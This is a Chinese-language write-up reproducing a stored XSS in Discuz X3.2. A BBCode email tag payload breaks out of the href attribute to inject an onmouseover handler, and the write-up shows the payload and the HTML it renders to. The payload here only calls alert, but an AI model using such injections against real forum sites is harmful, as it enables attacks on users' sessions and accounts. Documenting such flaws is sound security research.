# Discuz_X3.2_存储xss



## 环境

windows7+phpstudy pro+php5.2.17+apache

discuz版本:  Discuz_X3.2_SC_UTF8_0618.zip

漏洞：存储型`DOM_XSS BBcode `实体编码绕过 技巧分析



> BBCode是Bulletin Board Code的缩写，也有译为「BB代码」的，属于[轻量标记语言](https://baike.baidu.com/item/轻量标记语言/15575783)（Lightweight Markup Language）的一种，如字面上所显示的，它主要是使用在BBS、论坛、Blog等网络应用上。BBcode的语法通常为 [标记] 这种形式，即语法左右用两个中括号包围，以作为与正常文字间的区别。系统解译时遇上中括号便知道该处是BBcode，会在解译结果输出到用户端时转换成最为通用的HTML语法。



## 漏洞复现



注册账号，并发帖，内容如下：

`[email=7"onmouseover="alert(7)]7[/email] `

 然后使用拥有修改权限的账号点击如下编辑，并将移动至编辑框内的“7”：

[![yeLN6S.png](https://s3.ax1x.com/2021/02/01/yeLN6S.png)](https://imgchr.com/i/yeLN6S)

[![yeLdmQ.png](https://s3.ax1x.com/2021/02/01/yeLdmQ.png)](https://imgchr.com/i/yeLdmQ)



## 漏洞分析

对于输入的内容，并没有做过滤，同时BBCode 又将`[email=7"onmouseover="alert(7)]7[/email]` 解析到页面之后成为：`<a href="mailto:7" onmouseover="alert(7)" target="_blank">7</a>`





